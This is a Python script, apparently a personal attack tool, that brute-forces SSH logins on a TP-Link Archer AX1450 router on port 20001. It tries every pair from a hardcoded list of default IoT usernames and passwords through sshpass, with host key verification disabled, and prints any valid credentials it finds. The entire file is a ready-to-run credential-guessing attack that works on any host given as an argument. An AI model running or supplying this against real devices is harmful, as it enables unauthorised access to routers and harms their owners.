# SSH BRUTEFORCER
# TARGET: TP-Link Archer AX1450
# GOAL: bruteforce SSH on port 20001 with default IoT credentials


# UI IMPORTS
from rich.console import Console
from rich.panel import Panel
from rich.live import Live


# NETWORK IMPORTS
import subprocess


# ETC IMPORTS
import argparse


# CONSTANTS
console = Console()




class SSH_Brute_Forcer():
    """This will be used to bruteforce SSH on the target router"""


    # CLASS VARS
    usernames = [
        "root",
        "admin",
        "administrator",
        "user",
        "support",
        "guest",
        "service",
        "operator",
        "debug",
        "test",
    ]

    passwords = [
        "",
        "root",
        "admin",
        "password",
        "12345",
        "123456",
        "admin123",
        "root123",
        "tplink",
        "tp-link",
        "1234",
        "support",
        "guest",
        "user",
        "default",
        "system",
        "service",
        "test",
        "alpine",
    ]


    @classmethod
    def _try(cls, host, port, username, password, verbose=True):
        """Attempt a single SSH login"""

        try:

            cmd = [
                "sshpass", "-p", password,
                "ssh",
                "-p", str(port),
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "HostKeyAlgorithms=+ssh-rsa",
                "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
                "-o", "ConnectTimeout=3",
                f"{username}@{host}",
                "exit"
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)

            if result.returncode == 0:
                console.print(f"\n[bold green][+] VALID CREDS FOUND → [bold yellow]{username}:{password or '(blank)'}\n")
                return True

            if verbose: console.print(f"[bold red][-] Failed → [bold yellow]{username}:{password or '(blank)'}")
            return False

        except Exception as e:
            if verbose: console.print(f"[bold red][!] Error → [bold yellow]{username}:{password or '(blank)'}  -  {e}")
            return False


    @classmethod
    def main(cls):
        """This will start class wide logic"""

        parser = argparse.ArgumentParser(description="NSM SSH Bruteforcer")
        parser.add_argument("-t", "--target", default="192.168.0.1", help="Target IP (default: 192.168.0.1)")
        parser.add_argument("-p", "--port",   default=20001, type=int, help="Target port (default: 20001)")
        args = parser.parse_args()

        host = args.target
        port = args.port

        max_attempts = len(cls.usernames) * len(cls.passwords)
        attempt      = 0

        panel = Panel(
            renderable=f"[bold red]Target:[/bold red] {host}:{port}   [bold red]Attempts:[/bold red] {max_attempts}",
            title="[bold red]NSM SSH Bruteforcer",
            border_style="bold yellow",
            expand=False
        )

        console.print(panel)

        with Live(Panel(renderable=f"Attempt: 0/{max_attempts}", style="bold green", border_style="bold purple", expand=False), console=console, refresh_per_second=4) as live:

            for username in cls.usernames:
                for password in cls.passwords:

                    attempt += 1
                    live.update(Panel(renderable=f"[bold red]Attempt:[/bold red] [bold yellow]{attempt}/{max_attempts}[/bold yellow]   [bold red]Trying:[/bold red] [bold yellow]{username}:{password or '(blank)'}[/bold yellow]   [bold red]Target:[/bold red] [bold yellow]{host}:{port}", style="bold green", border_style="bold purple", expand=False))

                    found = cls._try(host=host, port=port, username=username, password=password)

                    if found: return

        console.print(f"\n[bold red][-] No valid credentials found after {max_attempts} attempts.")




if __name__ == "__main__": SSH_Brute_Forcer.main()
